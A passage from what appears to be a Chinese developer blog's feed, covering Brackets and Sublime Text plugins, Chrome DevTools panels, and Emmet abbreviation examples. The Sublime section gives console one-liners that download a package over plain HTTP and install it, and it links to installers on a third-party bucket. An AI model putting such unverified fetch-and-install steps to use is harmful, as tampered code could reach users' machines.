边栏添加文件图标</li><li><strong>Brackets CSS Class Code hint</strong> =&gt; 输入 <code>class</code> 或 <code>id</code> 时会出现 <code>css</code> 里面的 <code>class／id</code></li><li><strong>JS CSS Minifier</strong> =&gt; 压缩 <code>JS</code> 和 <code>CSS</code> 文件</li><li><strong>Beautify</strong> =&gt; 这个扩展可以让你的 <code>HTML</code>、 <code>CSS</code>、 <code>JavaScript</code> 等代码格式化一致，从而提升可读性</li><li><strong>Simple To-Do</strong> =&gt; 使用 <code>Simple To-Do</code> 可以确保你不会忘记项目的任务。它允许你在 <code>Brackets</code> 中为每一个项目创建 <code>TODO</code> 列表。</li><li><strong>Markdown Preview</strong> =&gt; <code>Markdown</code> 文件实时预览</li><li><strong>Markdown Toolbar</strong> =&gt; <code>Markdown</code> 文件的快捷工具栏</li><li><strong>JavaScript Globals</strong> =&gt; <code>javascript</code> 全局变量高亮</li><li><strong>Brackets Vue</strong> =&gt; <code>Vue</code> 文件语法高亮</li></ul><h1 id="Sublime-Text-3"><a href="#Sublime-Text-3" class="headerlink" title="Sublime Text 3"></a>Sublime Text 3</h1><blockquote><p>非开源。功能强大，可以编译 <code>C</code>、 <code>Java</code>、 <code>Python</code> 等编程语言。<code>Liunx</code> 下启动可以在终端输入 <code>subl</code>。部分插件依赖于 <code>Node.js</code>。</p></blockquote><h2 id="下载地址-2"><a href="#下载地址-2" class="headerlink" title="下载地址"></a>下载地址</h2><blockquote><p><a href="//www.sublimetext.com/3">Sublime Text 3</a><br><br>官网下载地址下不下来点击以下链接下载：<a href="http://oaq0p7t2g.bkt.clouddn.com/Sublime%20Text%20Build%203126%20Setup.exe?attname=" target="_blank" rel="external">Sublime Text Build 3126 Setup.exe</a><br><br><a href="http://oaq0p7t2g.bkt.clouddn.com/Sublime%20Text%20Build%203126%20x64%20Setup.exe?attname=" target="_blank" rel="external">Sublime Text Build 3126 x64 Setup.exe</a></p></blockquote><h2 id="安装插件-2"><a href="#安装插件-2" class="headerlink" title="安装插件"></a>安装插件</h2><h3 id="直接安装："><a href="#直接安装：" class="headerlink" title="直接安装："></a>直接安装：</h3><blockquote><p>安装Sublime text 3插件很方便，可以直接下载安装包解压缩到Packages目录（菜单-&gt;preferences-&gt;packages）</p></blockquote><h3 id="使用-Package-Control-安装"><a href="#使用-Package-Control-安装" class="headerlink" title="使用 Package Control 安装"></a>使用 Package Control 安装</h3><h4 id="安装-Package-Control-组件"><a href="#安装-Package-Control-组件" class="headerlink" title="安装 Package Control 组件"></a>安装 Package Control 组件</h4><blockquote><p>按 <code>Ctrl+</code> 调出 <code>console</code> 粘贴以下代码到底部命令行并回车：</p></blockquote><pre><code class="javascript">import urllib.request,os; pf = &#39;Package Control.sublime-package&#39;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), &#39;wb&#39;).write(urllib.request.urlopen( &#39;http://sublime.wbond.net/&#39; + pf.replace(&#39; &#39;,&#39;%20&#39;)).read())
</code></pre><blockquote><p>重启 <code>Sublime Text 3</code>。 如果在 <code>Perferences</code> -&gt; <code>package settings</code> 中看到 <code>package control</code> 这一项，则安装成功。 顺便贴下Sublime Text2 的代码。</p></blockquote><pre><code class="javascript">import urllib2,os; pf=&#39;Package Control.sublime-package&#39;; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) if not os.path.exists(ipp) else None; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler( ))); open( os.path.join( ipp, pf), &#39;wb&#39; ).write( urllib2.urlopen( &#39;http://sublime.wbond.net/&#39; +pf.replace( &#39; &#39;,&#39;%20&#39; )).read()); print( &#39;Please restart Sublime Text to finish installation&#39;)
</code></pre><h4 id="用组件安装插件的方法："><a href="#用组件安装插件的方法：" class="headerlink" title="用组件安装插件的方法："></a>用组件安装插件的方法：</h4><ol><li>按下 <code>Ctrl+Shift+P</code> 调出命令面板</li><li>输入 <code>install</code> 调出 Install Package 选项并回车，然后在列表中选中要安装的插件。</li></ol><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><blockquote><p>国内使用 <code>Sublime Text 3</code>，经常可能遇到无法安装可用插件问题，可 <code>remove</code> 掉 <code>Package Control</code> 重新安装下；如遇到连 <code>Package Control</code> 也无法安装，则可以在别处拷贝一份关于 <code>Package Control</code> 的文件(<code>Package Control.sublime-package</code>)存放于 <code>Installed Packages</code> 目录之下即可</p></blockquote><h3 id="插件推荐-2"><a href="#插件推荐-2" class="headerlink" title="插件推荐"></a>插件推荐</h3><ul><li><strong>Emmet</strong> =&gt; 前端开发者必备</li><li><strong>Autoprefixer</strong> =&gt; <code>CSS3</code> 私有前缀自动补全插件</li><li><strong>CSScomb</strong> =&gt; <code>CSS</code> 属性自动排序</li><li><strong>JsFormat</strong> =&gt; 一个 <code>JS</code> 代码格式化插件</li><li><strong>Tag</strong> =&gt; 格式化 <code>Html/Xml</code> 代码</li><li><strong>phpFormat</strong> =&gt; 格式化 <code>php</code> 代码</li><li><strong>HTML-CSS-JS Prettify</strong> =&gt; 一款集成了格式化（美化）html、css、js三种文件类型的插件,依赖于 <code>Node.js</code></li><li><strong>Minify</strong> =&gt; 自动压缩 <code>JS</code>、<code>CSS</code> 文件</li><li><strong>ColorPicker</strong> =&gt; 颜色选择器</li><li><strong>BracketHighlighter</strong> =&gt; 类似于代码匹配，可以匹配括号，引号等符号内的范围</li><li><strong>SublimeCodeIntel</strong> =&gt; 代码自动提示</li><li><strong>SublimeLinter</strong> =&gt; 用于高亮提示用户编写的代码中存在的不规范和错误的写法</li><li><strong>DocBlockr</strong> =&gt; 可以自动生成 <code>PHPDoc</code> 风格的注释</li><li><strong>ChineseLocalizations</strong> =&gt; 汉化 <code>Sublime Text</code></li><li><strong>MarkDownEditing</strong> =&gt; <code>markdown</code> 文件语法高亮</li><li><strong>vue Syntax Highlight</strong> =&gt; <code>vue</code> 文件语法高亮</li></ul><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> design </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Code </tag>
            
            <tag> Software </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[关于 Chrome 浏览器的调试方法]]></title>
      <url>/2016/08/debug-for-chrome-browser/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>作为前端开发人员，最佳的调试环境便是浏览器自带的开发者工具，此文则介绍 Chrome 浏览器的开发者工具的使用方法<a id="more"></a></p><h1 id="Chrome-浏览器调试窗口中常用的标签页"><a href="#Chrome-浏览器调试窗口中常用的标签页" class="headerlink" title="Chrome 浏览器调试窗口中常用的标签页"></a>Chrome 浏览器调试窗口中常用的标签页</h1><ul><li><strong>Elements</strong>：用于查看页面 <code>html</code> 代码</li><li><strong>NetWork</strong>：用于查看页面的网络请求</li><li><strong>Sources</strong>：用于查看页面所加载的源文件</li><li><strong>Timeline</strong>：用于查看页面加载 <code>JavaScript</code>、页面元素渲染等的时间</li><li><strong>Profiles</strong>：用于做性能优化的，包括查看CPU执行时间与内存占用</li><li><strong>Resource</strong>s：用于查看保存再本地的一些信息，比如 <code>cookie</code> 等</li><li><strong>Audits</strong>：一般用于优化前端页面、加速网页加载速度</li><li><strong>Console</strong>：<code>JavaScript</code> 控制台，这个面板可以查看错误信息、打印调试信息、写一些测试脚本，还可以当作 <code>JavaScript API</code> 查看用。</li></ul><blockquote><p>Chrome 浏览器不仅可以调试页面、 JavaScript、请求、资源、 cookie，还可以模拟手机进行调试</p></blockquote><h2 id="打开调试方法"><a href="#打开调试方法" class="headerlink" title="打开调试方法"></a>打开调试方法</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><blockquote><p>直接在页面上点击右键，然后选择审查元素</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/open-browser-debug-1.png" alt="打开调试方法"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><blockquote><p>在 Chrome 的工具中找到开发者工具</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/open-broswer-debug-2.png" alt="打开调试方法"></p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><blockquote><p>使用快捷键 Ctrl+Shift+I (或者 Ctrl+Shift+J 直接打开控制台)，或者直接按 F12</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/open-browser-debug-3.png" alt="打开调试方法"></p><h2 id="Elements-标签页"><a href="#Elements-标签页" class="headerlink" title="Elements 标签页"></a>Elements 标签页</h2><blockquote><p>Elements 标签页的左侧就是对页面HTML结构的查看与编辑，你可以直接在某个元素上双击修改元素的属性。</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/broswer-debug-elements-1.png" alt="Elements 标签页"></p><ul><li><strong>Add attribute</strong>：向该元素添加其他的属性</li><li><strong>Edit as HTML</strong>：直接对元素的 <code>HTML</code> 进行编辑，或者删除某个元素，所有的修改都会即时在页面上得到呈现。</li><li><strong>Copy</strong>：可以将 <code>HTML</code> 代码直接复制下来，在拷贝别人网站上面的 <code>HTML</code> 代码的时候灰常方便，你懂的~~</li><li><strong>Hide element</strong>：隐藏该元素</li><li><strong>Delete element</strong>：删掉该元素</li><li><strong>Scroll into view</strong>：视图滚动到选择的位置</li><li><strong>Break on</strong>：可以对某个元素进行监听，在 <code>JavaScript</code> 中对元素的属性或者 <code>HTML</code> 进行修改的时候，直接触发断点，跳转到对改元素进行修改的 <code>JavaScript</code> 代码处</li></ul><blockquote><p>Elements 标签页的右侧可以对元素的 CSS 进行查看与编辑修改</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/broswer-debug-elements-2.png" alt="Elements 标签页"></p><ul><li><strong>Styles</strong>：看 <code>HTML</code> 元素的样式</li><li><strong>Computed</strong>：可以看元素的盒子模型</li><li><strong>Event Listeners</strong>：对元素的监听方法将会显示在这里</li><li><strong>DOM Breakpoints</strong>：<code>DOM</code> 树的断点调试，（通过右键某一个元素，依次选择 <code>Break on</code>，选择 <code>Attributes modifications</code>），设置后刷新页面，当元素的属性发生改变时，暂停脚本并定位到该位置</li><li><strong>Properties</strong>：可以查看到元素具有的方法与属性，比查 <code>API</code>手册要方便得多</li></ul><h2 id="Network-标签页"><a href="#Network-标签页" class="headerlink" title="Network 标签页"></a>Network 标签页</h2><blockquote><p>Network 标签页对于分析网站请求的网络情况、查看某一请求的请求头和响应头还有响应内容很有用。 注意是在你打开 Chrome 开发者工具后发起的请求，才会在这里显示的哦。</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/browser-debug-network-1.png" alt="Network 标签页"></p><blockquote><p>点击左侧某一个具体请求URL，可以看到该请求的详细HTTP请求情况</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/browser-debug-network-2.png" alt="Network 标签页"></p><p>我们可以在这里看到 <code>HTTP 请求头</code>、<code>HTTP 响应头</code>、<code>HTTP 返回的内容</code>等信息。</p><ul><li><strong>Headers</strong>：请求头信息和响应头信息</li><li><strong>Preview</strong>：预览结果，如果是文件可以查看这个文件；如果是图片可以预览这个图片；如果是从服务器返回来的 <code>JSON</code> 数据，可以查看格式话后的 <code>JSON</code></li><li><strong>Response</strong>：从服务器返回的响应结果</li><li><strong>Cookies</strong>：请求和响应的 <code>Cookie</code></li><li><strong>Timing</strong>：具体的响应时间</li></ul><p><img src="http://oaq0p7t2g.bkt.clouddn.com/browser-debug-network-4.png" alt="Network 标签页"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/browser-debug-network-5.png" alt="Network 标签页"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/browser-debug-network-6.png" alt="Network 标签页"></p><h2 id="Sources-标签页"><a href="#Sources-标签页" class="headerlink" title="Sources 标签页"></a>Sources 标签页</h2><blockquote><p>Sources 标签页可以查看到请求的资源情况，包括 CSS、 JavaScript、图片等的内容。也可以设置各种断点。对存储的内容进行编辑然后保存也会实时的反应到页面上。</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/browser-debug-sources-1.png" alt="Sources 标签页"></p><h2 id="Audits-标签页"><a href="#Audits-标签页" class="headerlink" title="Audits 标签页"></a>Audits 标签页</h2><blockquote><p>这个对于优化前端页面、加速网页加载速度很有用哦。（相当与Yslow）</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/browser-debug-audits-3.png" alt="Audits 标签页"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/borwser-debug-audits-2.png" alt="Audits 标签页"></p><h2 id="Console-标签页"><a href="#Console-标签页" class="headerlink" title="Console 标签页"></a>Console 标签页</h2><blockquote><p>JavaScript 控制台，前端开发人员最经常使用它来调试 js 的错误。</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/browser-debug-console-1.png" alt="Console 标签页"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/browser-debug-console-2.png" alt="Console 标签页"></p><h2 id="移动端开发调试"><a href="#移动端开发调试" class="headerlink" title="移动端开发调试"></a>移动端开发调试</h2><blockquote><p>可以模拟出不同分辨率的移动端显示的效果，此效果仅供参考，因为还有可能受浏览器的不同而显示效果不同。</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/browser-debug-moblie-1.png" alt="移动端开发调试"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/browser-debug-moblie-2.png" alt="移动端开发调试"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> debug </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> CSS </tag>
            
            <tag> HTML5 </tag>
            
            <tag> Debug </tag>
            
            <tag> Software </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Emmet 用法举例]]></title>
      <url>/2016/08/emmet-usage-examples/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>Emmet 的前身是大名鼎鼎的 Zen coding。如果你从事 Web 前端开发的话，对该插件一定不会陌生。它使用仿 CSS 选择器的语法来代码，大大提高了 HTML/CSS 代码编写的速度<a id="more"></a></p><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><h2 id="子元素-gt"><a href="#子元素-gt" class="headerlink" title="子元素: &gt;"></a>子元素: &gt;</h2><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><code>nav&gt;ul&gt;li</code></p><pre><code class="html">&lt;nav&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;/li&gt;
  &lt;/ul&gt;
&lt;/nav&gt;
</code></pre><h2 id="兄弟元素"><a href="#兄弟元素" class="headerlink" title="兄弟元素: +"></a>兄弟元素: +</h2><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p><code>div+p+bq</code></p><pre><code class="html">&lt;div&gt;&lt;/div&gt;
&lt;p&gt;&lt;/p&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
</code></pre><h2 id="在某个元素之上"><a href="#在某个元素之上" class="headerlink" title="在某个元素之上: ^"></a>在某个元素之上: ^</h2><h3 id="例子一"><a href="#例子一" class="headerlink" title="例子一"></a>例子一</h3><p><code>div+div&gt;p&gt;span+em^bq</code></p><pre><code class="html">&lt;div&gt;&lt;/div&gt;
&lt;div&gt;
  &lt;p&gt;&lt;span&gt;&lt;/span&gt;&lt;em&gt;&lt;/em&gt;&lt;/p&gt;
  &lt;blockquote&gt;&lt;/blockquote&gt;
&lt;/div&gt;
</code></pre><h3 id="例子二"><a href="#例子二" class="headerlink" title="例子二"></a>例子二</h3><p><code>div+div&gt;p&gt;span+em^^bq</code></p><pre><code class="html">&lt;div&gt;&lt;/div&gt;
&lt;div&gt;
  &lt;p&gt;&lt;span&gt;&lt;/span&gt;&lt;em&gt;&lt;/em&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;blockquote&gt;&lt;/blockquote&gt;
</code></pre><h2 id="分为一组"><a href="#分为一组" class="headerlink" title="分为一组: ()"></a>分为一组: ()</h2><h3 id="例子一-1"><a href="#例子一-1" class="headerlink" title="例子一"></a>例子一</h3><p><code>div&gt;(header&gt;ul&gt;li*2&gt;a)+footer&gt;p</code></p><pre><code class="html">&lt;div&gt;
  &lt;header&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/header&gt;
  &lt;footer&gt;
    &lt;p&gt;&lt;/p&gt;
  &lt;/footer&gt;
&lt;/div&gt;
</code></pre><h3 id="例子二-1"><a href="#例子二-1" class="headerlink" title="例子二"></a>例子二</h3><p><code>(div&gt;dl&gt;(dt+dd)*3)+footer&gt;p</code></p><pre><code class="html">&lt;div&gt;
  &lt;dl&gt;
    &lt;dt&gt;&lt;/dt&gt;
    &lt;dd&gt;&lt;/dd&gt;
    &lt;dt&gt;&lt;/dt&gt;
    &lt;dd&gt;&lt;/dd&gt;
    &lt;dt&gt;&lt;/dt&gt;
    &lt;dd&gt;&lt;/dd&gt;
  &lt;/dl&gt;
&lt;/div&gt;
&lt;footer&gt;
  &lt;p&gt;&lt;/p&gt;
&lt;/footer&gt;
</code></pre><h2 id="倍增元素"><a href="#倍增元素" class="headerlink" title="倍增元素: *"></a>倍增元素: *</h2><h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p><code>ul&gt;li*5</code></p><pre><code class="html">&lt;ul&gt;
  &lt;li&gt;&lt;/li&gt;
  &lt;li&gt;&lt;/li&gt;
  &lt;li&gt;&lt;/li&gt;
  &lt;li&gt;&lt;/li&gt;
  &lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;
</code></pre><h2 id="项目数字递增"><a href="#项目数字递增" class="headerlink" title="项目数字递增: $"></a>项目数字递增: $</h2><h3 id="例子一-2"><a href="#例子一-2" class="headerlink" title="例子一"></a>例子一</h3><p><code>ul&gt;li.item$*5</code></p><pre><code class="html">&lt;ul&gt;
  &lt;li class=&quot;item1&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item2&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item3&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item4&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item5&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
</code></pre><h3 id="例子二-2"><a href="#例子二-2" class="headerlink" title="例子二"></a>例子二</h3><p><code>h$[title=item$]{Header $}*3</code></p><pre><code class="html">&lt;h1 title=&quot;item1&quot;&gt;Header 1&lt;/h1&gt;
&lt;h2 title=&quot;item2&quot;&gt;Header 2&lt;/h2&gt;
&lt;h3 title=&quot;item3&quot;&gt;Header 3&lt;/h3&gt;
</code></pre><h3 id="例子三"><a href="#例子三" class="headerlink" title="例子三"></a>例子三</h3><p><code>ul&gt;li.item$$$*5</code></p><pre><code class="html">&lt;ul&gt;
  &lt;li class=&quot;item001&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item002&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item003&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item004&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item005&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
</code></pre><h3 id="例子四"><a href="#例子四" class="headerlink" title="例子四"></a>例子四</h3><p><code>ul&gt;li.item$@-*5</code></p><pre><code class="html">&lt;ul&gt;
  &lt;li class=&quot;item5&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item4&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item3&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item2&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item1&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
</code></pre><h3 id="例子五"><a href="#例子五" class="headerlink" title="例子五"></a>例子五</h3><p><code>ul&gt;li.item$@3*5</code></p><pre><code class="html">&lt;ul&gt;
  &lt;li class=&quot;item3&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item4&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item5&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item6&quot;&gt;&lt;/li&gt;
  &lt;li class=&quot;item7&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
</code></pre><h2 id="ID-和-CLASS-属性"><a href="#ID-和-CLASS-属性" class="headerlink" title="ID 和 CLASS 属性"></a>ID 和 CLASS 属性</h2><h3 id="例子一-3"><a href="#例子一-3" class="headerlink" title="例子一"></a>例子一</h3><p>`</p><h1 id="header"><a href="#header" class="headerlink" title="header"></a>header</h1><p>`</p><pre><code class="html">&lt;div id=&quot;header&quot;&gt;&lt;/div&gt;
</code></pre><h2 id="例子二-3"><a href="#例子二-3" class="headerlink" title="例子二"></a>例子二</h2><p><code>.title</code></p><pre><code class="html">&lt;div class=“title”&gt;&lt;/div&gt;
</code></pre><h2 id="例子一-4"><a href="#例子一-4" class="headerlink" title="例子一"></a>例子一</h2><p><code>footer#search.wide</code></p><pre><code class="html">&lt;footer id=&quot;search&quot; class=&quot;wide&quot;&gt;&lt;/footer&gt;
</code></pre><h2 id="例子四-1"><a href="#例子四-1" class="headerlink" title="例子四"></a>例子四</h2><p><code>p.class1.class2.class3</code></p><pre><code class="html">&lt;p class=&quot;class1 class2 class3&quot;&gt;&lt;/p&gt;
</code></pre><h2 id="自定义属性"><a href="#自定义属性" class="headerlink" title="自定义属性"></a>自定义属性</h2><h3 id="例子一-5"><a href="#例子一-5" class="headerlink" title="例子一"></a>例子一</h3><p><code>p[title=&quot;Hello world&quot;]</code></p><pre><code class="html">&lt;p title=&quot;Hello world&quot;&gt;&lt;/p&gt;
</code></pre><h3 id="例子二-4"><a href="#例子二-4" class="headerlink" title="例子二"></a>例子二</h3><p><code>td[rowspan=2 colspan=3 title]</code></p><pre><code class="html">&lt;td rowspan=&quot;2&quot; colspan=&quot;3&quot; title=&quot;&quot;&gt;&lt;/td&gt;
</code></pre><h3 id="例子三-1"><a href="#例子三-1" class="headerlink" title="例子三"></a>例子三</h3><p><code>[a=&quot;value1&quot; b=&quot;value2&quot;]</code></p><pre><code class="html">&lt;div a=&quot;value1&quot; b=&quot;value2&quot;&gt;&lt;/div&gt;
</code></pre><h2 id="文本内容"><a href="#文本内容" class="headerlink" title="文本内容: {}"></a>文本内容: {}</h2><h3 id="例子一-6"><a href="#例子一-6" class="headerlink" title="例子一"></a>例子一</h3><p><code>a{Click me}</code></p><pre><code class="html">&lt;a href=&quot;&quot;&gt;Click me&lt;/a&gt;
</code></pre><h3 id="例子二-5"><a href="#例子二-5" class="headerlink" title="例子二"></a>例子二</h3><p><code>p&gt;{Click }+a{here}+{ to continue}</code></p><pre><code class="html">&lt;p&gt;Click &lt;a href=&quot;&quot;&gt;here&lt;/a&gt; to continue&lt;/p&gt;
</code></pre><h2 id="缺省标签名"><a href="#缺省标签名" class="headerlink" title="缺省标签名"></a>缺省标签名</h2><h3 id="例子一-7"><a href="#例子一-7" class="headerlink" title="例子一"></a>例子一</h3><p><code>.class1</code></p><pre><code class="html">&lt;div class=&quot;class1&quot;&gt;&lt;/div&gt;
</code></pre><h3 id="例子二-6"><a href="#例子二-6" class="headerlink" title="例子二"></a>例子二</h3><p><code>em&gt;.class1</code></p><pre><code class="html">&lt;em&gt;&lt;span class=&quot;class1&quot;&gt;&lt;/span&gt;&lt;/em&gt;
</code></pre><h3 id="例子三-2"><a href="#例子三-2" class="headerlink" title="例子三"></a>例子三</h3><p><code>ul&gt;.class1</code></p><pre><code class="html">&lt;ul&gt;
  &lt;li class=&quot;class1&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
</code></pre><h3 id="例子四-2"><a href="#例子四-2" class="headerlink" title="例子四"></a>例子四</h3><p><code>table&gt;.row&gt;.col</code></p><pre><code class="html">&lt;table&gt;
  &lt;tr class=&quot;row&quot;&gt;
    &lt;td class=&quot;col&quot;&gt;&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
</code></pre><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="HTML-基本模板"><a href="#HTML-基本模板" class="headerlink" title="HTML 基本模板"></a>HTML 基本模板</h2><h3 id="doc"><a href="#doc" class="headerlink" title="doc"></a>doc</h3><p><code>扩展写法</code></p><p><code>html&gt;(header&gt;meta[charset=UTF-8]+title{${1:Document}})+body</code></p><pre><code class="html">&lt;html&gt;
&lt;head&gt;
  &lt;meta charset=&quot;UTF-8&quot;&gt;
  &lt;title&gt;Document&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><h3 id="或者-html-5"><a href="#或者-html-5" class="headerlink" title="! 或者 html:5"></a>! 或者 html:5</h3><p><code>扩展写法</code></p><p><code>!!!+doc[lang=${lang}]</code></p><pre><code class="html">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
  &lt;meta charset=&quot;UTF-8&quot;&gt;
  &lt;title&gt;Document&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><h3 id="doc4"><a href="#doc4" class="headerlink" title="doc4"></a>doc4</h3><p><code>扩展写法</code></p><p><code>html&gt;(head&gt;meta[http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=${charset}&quot;]+title{${1:Document}})+body</code></p><pre><code class="html">&lt;html&gt;
&lt;head&gt;
  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;
  &lt;title&gt;Document&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><h3 id="html-4t"><a href="#html-4t" class="headerlink" title="html:4t"></a>html:4t</h3><p><code>扩展写法</code></p><p><code>!!!4t+doc4[lang=${lang}]</code></p><pre><code class="html">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;//www.w3.org/TR/html4/loose.dtd&quot;&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;
  &lt;title&gt;Document&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><h3 id="html-4s"><a href="#html-4s" class="headerlink" title="html:4s"></a>html:4s</h3><p><code>扩展写法</code></p><p><code>!!!4s+doc4[lang=${lang}]</code></p><pre><code class="html">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;//www.w3.org/TR/html4/strict.dtd&quot;&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;
  &lt;title&gt;Document&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><h2 id="HTML-基本元素"><a href="#HTML-基本元素" class="headerlink" title="HTML 基本元素"></a>HTML 基本元素</h2><h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><h4 id="a-link"><a href="#a-link" class="headerlink" title="a:link"></a>a:link</h4><pre><code class="html">&lt;a href=&quot;//&quot;&gt;&lt;/a&gt;
</code></pre><h4 id="a-mail"><a href="#a-mail" class="headerlink" title="a:mail"></a>a:mail</h4><pre><code class="html">&lt;a href=&quot;mailto:&quot;&gt;&lt;/a&gt;
</code></pre><h4 id="area"><a href="#area" class="headerlink" title="area"></a>area</h4><pre><code class="html">&lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot;&gt;
</code></pre><h4 id="area-d"><a href="#area-d" class="headerlink" title="area:d"></a>area:d</h4><pre><code class="html">&lt;area shape=&quot;default&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot;&gt;
</code></pre><h4 id="area-c"><a href="#area-c" class="headerlink" title="area:c"></a>area:c</h4><pre><code class="html">&lt;area shape=&quot;circle&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot;&gt;
</code></pre><h4 id="area-r"><a href="#area-r" class="headerlink" title="area:r"></a>area:r</h4><pre><code class="html">&lt;area shape=&quot;rect&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot;&gt;
</code></pre><h4 id="area-p"><a href="#area-p" class="headerlink" title="area:p"></a>area:p</h4><pre><code class="html">&lt;area shape=&quot;poly&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot;&gt;
</code></pre><h3 id="B"><a href="#B" class="headerlink" title="B"></a>B</h3><h4 id="btn-r"><a href="#btn-r" class="headerlink" title="btn:r"></a>btn:r</h4><pre><code class="html">&lt;button type=&quot;reset&quot;&gt;&lt;/button&gt;
</code></pre><h4 id="btn-s"><a href="#btn-s" class="headerlink" title="btn:s"></a>btn:s</h4><pre><code class="html">&lt;button type=&quot;submit&quot;&gt;&lt;/button&gt;
</code></pre><h3 id="F"><a href="#F" class="headerlink" title="F"></a>F</h3><h4 id="form-get"><a href="#form-get" class="headerlink" title="form:get"></a>form:get</h4><pre><code class="html">&lt;form action=&quot;get&quot;&gt;&lt;/form&gt;
